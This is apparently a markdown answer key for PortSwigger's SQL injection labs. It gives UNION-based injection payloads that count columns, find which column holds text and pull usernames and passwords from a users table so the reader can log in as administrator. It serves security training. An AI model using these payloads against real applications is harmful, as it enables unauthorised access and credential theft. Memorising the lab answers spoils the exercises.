# [SQL Injection Labs](https://portswigger.net/web-security/all-labs)

This contains answers and spoilers to all of PortSwigger's SQL Injection labs.
Do not read unless explicitly looking for exact answers

## UNION - Determine number of columns

<details> 
  <summary> <b> ANSWER SPOILER ALERT </b> </summary>
      
  Identify number of columns by appending NULL to UNION SELECT string:  

    category=' UNION SELECT NULL,NULL,NULL--
  
</details>

## UNION - Find column containing text

<details> 
  <summary> <b> ANSWER SPOILER ALERT </b> </summary>
 
 Identify number of columns by appending NULL to UNION SELECT string:  
  
    category=' UNION SELECT NULL,NULL,NULL--
      
 Replace NULL with string to identify column:
  
    category=' UNION SELECT NULL,'[STRING]',NULL--
      
</details>

## UNION - Retrive data from other tables

<details> 
  <summary> <b> ANSWER SPOILER ALERT </b> </summary>
   
  Verify number of colums with the NULL payload:
  
    category=' UNION SELECT NULL,NULL--
    
  Verify they contain text:
  
    category=' UNION SELECT 'abc','def'--
    
  Retrieve data from users table:
  
    category=' UNION SELECT username, password FROM users--
  
  Login using administrator and password found from injection

</details>
